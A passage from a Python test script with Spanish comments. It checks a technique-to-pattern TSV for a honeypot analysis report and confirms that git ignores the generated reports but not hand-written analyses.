            malas.append("linea %d: patron invalido (%s)" % (n, exc))
igual("todas las filas de ttp.tsv estan bien formadas", [], malas)
check("y hay bastantes tecnicas para que el informe diga algo", filas >= 30)
print("        (%d filas, %d tecnicas distintas)" % (filas, len(ids)))

# Un mismo id no puede tener dos nombres: en el informe se agrupa por
# (id, nombre), asi que dos nombres parten la misma tecnica en dos filas.
nombres = {}
chocan = []
with open(TTP, encoding="utf-8") as fh:
    for linea in fh:
        if linea.lstrip().startswith("#") or not linea.strip():
            continue
        campos = linea.rstrip("\n").split("\t")
        if len(campos) < 3:
            continue
        if campos[0] in nombres and nombres[campos[0]] != campos[1]:
            chocan.append("%s: '%s' y '%s'"
                          % (campos[0], nombres[campos[0]], campos[1]))
        nombres[campos[0]] = campos[1]
igual("cada tecnica tiene un solo nombre", [], chocan)

# =====================================================================
print()
print("== el informe no puede acabar en un commit ==")
r = subprocess.run(["git", "check-ignore", "-q", "analisis-senuelo-2026-01-01.html"],
                   cwd=REPO, capture_output=True)
igual("el nombre por defecto lo ignora git", 0, r.returncode)
r = subprocess.run(["git", "check-ignore", "-q",
                    "analisis-redtail-2026-08-22.md"],
                   cwd=REPO, capture_output=True)
check("y la regla NO se lleva por delante los analisis escritos a mano",
      r.returncode != 0)

print()
print("-------------------------------------")
print("ok: %d   fallos: %d" % (OK, MAL))
sys.exit(1 if MAL else 0)
